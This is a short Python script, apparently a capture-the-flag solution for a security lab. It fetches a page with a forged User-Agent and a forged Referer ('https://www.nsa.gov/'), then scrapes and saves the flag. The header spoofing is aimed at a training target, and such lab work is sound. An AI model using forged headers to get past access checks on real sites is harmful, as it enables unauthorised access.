import requests
from bs4 import BeautifulSoup
import sys
import json


def get_flag(host_name, page):
    flag = None

    headers = {
        'User-Agent': 'ft_bornToSec',
        'Referer': 'https://www.nsa.gov/'
    }

    session = requests.Session()
    session.get('http://{host}/'.format(host=host_name))
    session.headers.update(**headers)
    response = session.get('http://{host}/?page={page}'.format(host=host_name, page=page))

    if response.status_code == 200:
        flag = BeautifulSoup(response.content.decode('utf-8'), 'html.parser').find('h2').text.split(':')[-1].strip()

        with open('../flag', 'w') as f:
            f.write(flag+'\n')

    return flag


def check_host_name(host_name):
    return requests.get('http://'+host_name).status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]
        page = 'e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c'

        if check_host_name(host_name):
            print(f"12 : {get_flag(host_name, page)} - header modified for http://{host_name}/?page={page}")
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
